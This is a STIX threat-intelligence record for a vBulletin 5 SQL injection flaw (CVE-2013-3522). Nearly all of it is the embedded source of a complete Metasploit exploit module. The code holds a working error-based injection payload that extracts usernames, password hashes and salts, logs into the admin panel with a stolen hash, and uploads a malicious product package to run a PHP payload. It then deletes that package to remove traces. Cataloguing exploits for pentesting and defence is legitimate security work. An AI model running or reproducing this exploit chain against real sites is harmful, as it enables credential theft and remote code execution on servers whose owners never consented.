{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--971ef630-dcee-4f6c-b139-022eb80aa653",
    "created": "2024-08-14T17:13:46.744222Z",
    "modified": "2024-08-14T17:13:46.744226Z",
    "name": "vBulletin index.php/ajax/api/reputation/vote nodeid Parameter SQL Injection",
    "description": " This module exploits a SQL injection vulnerability found in vBulletin 5 that has been used in the wild since March 2013. This module uses the sqli to extract the web application's usernames and hashes. With the retrieved information tries to log into the admin control panel in order to deploy the PHP payload. This module has been tested successfully on VBulletin Version 5.0.0 Beta 13 over an Ubuntu Linux distribution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/vbulletin_vote_sqli_exec.rb",
            "external_id": "vbulletin_vote_sqli_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3522"
        },
        {
            "source_name": "reference",
            "url": "http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'vBulletin index.php/ajax/api/reputation/vote nodeid Parameter SQL Injection',\n      'Description'    => %q{\n        This module exploits a SQL injection vulnerability found in vBulletin 5 that has\n        been used in the wild since March 2013. This module uses the sqli to extract the\n        web application's usernames and hashes. With the retrieved information tries to\n        log into the admin control panel in order to deploy the PHP payload. This module\n        has been tested successfully on VBulletin Version 5.0.0 Beta 13 over an Ubuntu\n        Linux distribution.\n      },\n      'Author'         =>\n        [\n          'Orestis Kourides', # Vulnerability discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-3522' ],\n          [ 'OSVDB', '92031' ],\n          [ 'EDB', '24882' ],\n          [ 'BID', '58754' ],\n          [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]\n        ],\n      'Privileged'     => false, # web server context\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 10000 # Just value big enough to fit any php payload\n        },\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'vBulletin 5.0.0 Beta 11-28', { }]],\n      'DisclosureDate' => '2013-03-25',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new(\"TARGETURI\", [true, 'The path to vBulletin', '/']),\n        OptInt.new(\"NODE\", [false, 'Valid Node ID']),\n        OptInt.new(\"MINNODE\", [true, 'Valid Node ID', 1]),\n        OptInt.new(\"MAXNODE\", [true, 'Valid Node ID', 100])\n      ])\n  end\n\n  def exists_node?(id)\n    mark = rand_text_alpha(8 + rand(5))\n    result = do_sqli(id, \"select '#{mark}'\")\n\n    if result and result =~ /#{mark}/\n      return true\n    end\n\n    return false\n  end\n\n  def brute_force_node\n    min = datastore[\"MINNODE\"]\n    max = datastore[\"MAXNODE\"]\n\n    if min > max\n      print_error(\"MINNODE can't be major than MAXNODE\")\n      return nil\n    end\n\n    for node_id in min..max\n      if exists_node?(node_id)\n        return node_id\n      end\n    end\n\n    return nil\n  end\n\n  def get_node\n    if datastore['NODE'].nil? or datastore['NODE'] <= 0\n      print_status(\"Brute forcing to find a valid node id...\")\n      return brute_force_node\n    end\n\n    print_status(\"Checking node id #{datastore['NODE']}...\")\n    if exists_node?(datastore['NODE'])\n      return datastore['NODE']\n    else\n      return nil\n    end\n  end\n\n  def do_sqli(node, query)\n    mark = Rex::Text.rand_text_alpha(5 + rand(3))\n    random_and = Rex::Text.rand_text_numeric(4)\n    injection = \") and(select 1 from(select count(*),concat((select (select concat('#{mark}',cast((#{query}) as char),'#{mark}')) \"\n    injection << \"from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) \"\n    injection << \"AND (#{random_and}=#{random_and}\"\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, \"index.php\", \"ajax\", \"api\", \"reputation\", \"vote\"),\n      'vars_post' =>\n        {\n          'nodeid'  => \"#{node}#{injection}\",\n        }\n      })\n\n    unless res and res.code == 200 and res.body.to_s =~ /Database error in vBulletin/\n      return nil\n    end\n\n    data = \"\"\n\n    if res.body.to_s =~ /#{mark}(.*)#{mark}/\n      data = $1\n    end\n\n    return data\n  end\n\n  def get_user_data(node_id, user_id)\n    user = do_sqli(node_id, \"select username from user limit #{user_id},#{user_id+1}\")\n    pass = do_sqli(node_id, \"select password from user limit #{user_id},#{user_id+1}\")\n    salt = do_sqli(node_id, \"select salt from user limit #{user_id},#{user_id+1}\")\n\n    return [user, pass, salt]\n  end\n\n  def do_login(user, hash)\n    res = send_request_cgi({\n      'uri'           => normalize_uri(target_uri.path, \"login.php\"),\n      'method'        => 'POST',\n      'encode_params' => false,\n      'vars_get'      => {\n        'do' => 'login'\n      },\n      'vars_post'     => {\n        'url'                      => '%2Fadmincp%2F',\n        'securitytoken'            => 'guest',\n        'logintype'                => 'cplogin',\n        'do'                       => 'login',\n        'vb_login_md5password'     => hash,\n        'vb_login_md5password_utf' => hash,\n        'vb_login_username'        => user,\n        'vb_login_password'        => '',\n        'cssprefs'                 => ''\n      }\n    })\n\n    if res and res.code == 200 and res.body and res.body.to_s =~ /window\\.location.*admincp/ and !res.get_cookies.empty?\n      session = res.get_cookies\n    else\n      return nil\n    end\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(target_uri.path, \"admincp\", \"/\"),\n      'cookie' => session\n    })\n\n    if res and res.code == 200 and res.body and res.body.to_s =~ /<title>Forums Admin Control Panel<\\/title>/\n      return session\n    else\n      return nil\n    end\n\n  end\n\n  def get_token(response)\n    token_info = {\n      :session_hash => \"\",\n      :security_token => \"\",\n      :admin_hash => \"\"\n    }\n\n    if response =~ /var SESSIONHASH = \"([0-9a-f]+)\";/\n      token_info[:session_hash] = $1\n    end\n\n    if response =~ /var ADMINHASH = \"([0-9a-f]+)\";/\n      token_info[:admin_hash] = $1\n    end\n\n    if response =~ /var SECURITYTOKEN = \"([0-9a-f\\-]+)\";/\n      token_info[:security_token] = $1\n    end\n\n    return token_info\n  end\n\n  def get_install_token\n    res = send_request_cgi({\n      \"uri\"      => normalize_uri(target_uri.path, \"admincp\", \"product.php\"),\n      \"vars_get\" => {\n        \"do\" => \"productadd\"\n      },\n      \"cookie\"   => @session\n    })\n\n    unless res and res.code == 200 and res.body.to_s =~ /SECURITYTOKEN/\n      return nil\n    end\n\n\n    return get_token(res.body.to_s)\n  end\n\n  def install_product(token_info)\n\n    xml_product = <<-EOF\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n\n<product productid=\"#{@product_id}\" active=\"0\">\n  <title>#{@product_id}</title>\n  <description>#{@product_id}</description>\n  <version>1.0</version>\n  <url>http://#{@product_id}.loc</url>\n  <versioncheckurl>http://#{@product_id}.loc/version.xml</versioncheckurl>\n  <dependencies>\n    <dependency dependencytype=\"vbulletin\" minversion=\"\" maxversion=\"\" />\n  </dependencies>\n  <codes>\n    <code version=\"*\">\n      <installcode>\n        <![CDATA[\n        #{payload.encoded}\n        ]]>\n      </installcode>\n      <uninstallcode />\n    </code>\n  </codes>\n  <templates>\n  </templates>\n  <stylevardfns>\n  </stylevardfns>\n  <stylevars>\n  </stylevars>\n  <hooks>\n  </hooks>\n  <phrases>\n  </phrases>\n  <options>\n  </options>\n  <helptopics>\n  </helptopics>\n  <cronentries>\n  </cronentries>\n  <faqentries>\n  </faqentries>\n  <widgets>\n  </widgets>\n</product>\n    EOF\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(token_info[:session_hash], nil, nil, \"form-data; name=\\\"s\\\"\")\n    post_data.add_part(\"productimport\", nil, nil, \"form-data; name=\\\"do\\\"\")\n    post_data.add_part(token_info[:admin_hash], nil, nil, \"form-data; name=\\\"adminhash\\\"\")\n    post_data.add_part(token_info[:security_token], nil, nil, \"form-data; name=\\\"securitytoken\\\"\")\n    post_data.add_part(xml_product, \"text/xml\", nil, \"form-data; name=\\\"productfile\\\"; filename=\\\"product_juan2.xml\\\"\")\n    post_data.add_part(\"\", nil, nil, \"form-data; name=\\\"serverfile\\\"\")\n    post_data.add_part(\"1\", nil, nil, \"form-data; name=\\\"allowoverwrite\\\"\")\n    post_data.add_part(\"999999999\", nil, nil, \"form-data; name=\\\"MAX_FILE_SIZE\\\"\")\n\n    data = post_data.to_s\n\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.path, \"admincp\", \"product.php\"),\n      'method'   => \"POST\",\n      'ctype'    => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie'   => @session,\n      'vars_get' => {\n        \"do\" => \"productimport\"\n      },\n      'data'     => data\n    })\n\n    if res and res.code == 200 and res.body and res.body.to_s =~ /Product #{@product_id} Imported/\n      return true\n    elsif res\n      fail_with(Failure::Unknown, \"#{peer} - Error when trying to install the product.\")\n    else\n      return false\n    end\n\n  end\n\n  def get_delete_token\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.path, \"admincp\", \"product.php\"),\n      'cookie'   => @session,\n      'vars_get' => {\n        \"do\" => \"productdelete\",\n        \"productid\" => @product_id,\n        \"s\" => @session_hash\n      }\n    })\n\n    if res and res.code == 200 and res.body.to_s =~ /SECURITYTOKEN/\n      return get_token(res.body.to_s)\n    end\n\n    return nil\n  end\n\n  def delete_product(token_info)\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.path, \"admincp\", \"product.php\"),\n      'method'   => \"POST\",\n      'cookie'   => @session,\n      'vars_get' => {\n        \"do\" => \"productkill\"\n      },\n      'vars_post' => {\n        \"s\"             => token_info[:session_hash],\n        \"do\"            => \"productkill\",\n        \"adminhash\"     => token_info[:admin_hash],\n        \"securitytoken\" => token_info[:security_token],\n        \"productid\"     => @product_id\n      }\n    })\n\n    if res and res.code == 200 and res.body.to_s =~ /Product #{@product_id} Uninstalled/\n      return true\n    end\n\n    return false\n  end\n\n  def check\n    node_id = get_node\n\n    unless node_id.nil?\n      return Msf::Exploit::CheckCode::Appears\n    end\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"index.php\")\n    })\n\n    if res and res.code == 200 and res.body.to_s =~ /\"simpleversion\": \"v=5/\n      return Msf::Exploit::CheckCode::Appears\n    end\n\n    return Msf::Exploit::CheckCode::Safe\n  end\n\n  def on_new_session(session)\n    print_status(\"Getting the uninstall token info...\")\n    delete_token = get_delete_token\n    if delete_token.nil?\n      print_error(\"Failed to get the uninstall token, the product #{@product_id} should be uninstalled manually...\")\n      return\n    end\n\n    print_status(\"Deleting the product #{@product_id}...\")\n    if delete_product(delete_token)\n      print_good(\"Product #{@product_id} deleted\")\n    else\n      print_error(\"Failed uninstall the product #{@product_id}, should be done manually...\")\n    end\n  end\n\n  def exploit\n    print_status(\"Checking for a valid node id...\")\n    node_id = get_node\n    if node_id.nil?\n      print_error(\"node id not found\")\n      return\n    end\n\n    print_good(\"Using node id #{node_id} to exploit sqli... Counting users...\")\n    data = do_sqli(node_id, \"select count(*) from user\")\n    if data.empty?\n      print_error(\"Error exploiting sqli\")\n      return\n    end\n    count_users = data.to_i\n    users = []\n    print_good(\"#{count_users} users found\")\n\n    for i in 0..count_users - 1\n      user = get_user_data(node_id, i)\n      connection_details = {\n          module_fullname: self.fullname,\n          username: user[0],\n          private_data: user[1],\n          private_type: :nonreplayable_hash,\n          jtr_format: 'md5,raw-md5',\n          proof: \"salt: #{user[2]}\",\n          status: Metasploit::Model::Login::Status::UNTRIED\n      }.merge(service_details)\n      create_credential_and_login(connection_details)\n\n      # why is this stored another way?\n      report_auth_info({\n        :host => rhost,\n        :port => rport,\n        :user => user[0],\n        :pass => user[1],\n        :type => \"hash\",\n        :sname => (ssl ? \"https\" : \"http\"),\n        :proof => \"salt: #{user[2]}\" # Using proof to store the hash salt\n      })\n      users << user\n    end\n\n    @session = nil\n    users.each do |user|\n      print_status(\"Trying to log into vBulletin admin control panel as #{user[0]}...\")\n      @session = do_login(user[0], user[1])\n      unless @session.blank?\n        print_good(\"Logged in successfully as #{user[0]}\")\n        break\n      end\n    end\n\n    if @session.blank?\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to log into the vBulletin admin control panel\")\n    end\n\n    print_status(\"Getting the install product security token...\")\n    install_token = get_install_token\n    if install_token.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Failed to get the install token\")\n    end\n\n    @session_hash = install_token[:session_hash]\n    @product_id = rand_text_alpha_lower(5 + rand(8))\n    print_status(\"Installing the malicious product #{@product_id}...\")\n    if install_product(install_token)\n      print_good(\"Product successfully installed... payload should be executed...\")\n    else\n      # Two situations trigger this path:\n      # 1) Upload failed but there wasn't answer from the server. I don't think it's going to happen often.\n      # 2) New session, for exemple when using php/meterpreter/reverse_tcp, the common situation.\n      # Because of that fail_with isn't used here.\n      return\n    end\n\n    print_status(\"Getting the uninstall token info...\")\n    delete_token = get_delete_token\n    if delete_token.nil?\n      print_error(\"Failed to get the uninstall token, the product #{@product_id} should be uninstalled manually...\")\n      return\n    end\n\n    print_status(\"Deleting the product #{@product_id}...\")\n    if delete_product(delete_token)\n      print_good(\"Product #{@product_id} deleted\")\n    else\n      print_error(\"Failed uninstall the product #{@product_id}, should be done manually...\")\n    end\n\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2013-03-25",
    "x_mitre_platforms": [
        "php'"
    ]
}